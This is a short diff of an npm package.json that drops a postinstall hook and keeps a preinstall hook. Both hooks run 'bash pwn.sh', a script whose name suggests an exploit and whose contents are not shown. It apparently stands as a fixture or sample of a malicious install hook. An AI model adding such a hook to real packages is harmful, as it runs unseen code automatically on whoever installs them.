@@ -3,7 +3,6 @@
   "version": "1.0.0",
   "main": "index.js",
   "scripts": {
-    "preinstall": "bash pwn.sh",
-    "postinstall": "bash pwn.sh"
+    "preinstall": "bash pwn.sh"
   }
 }
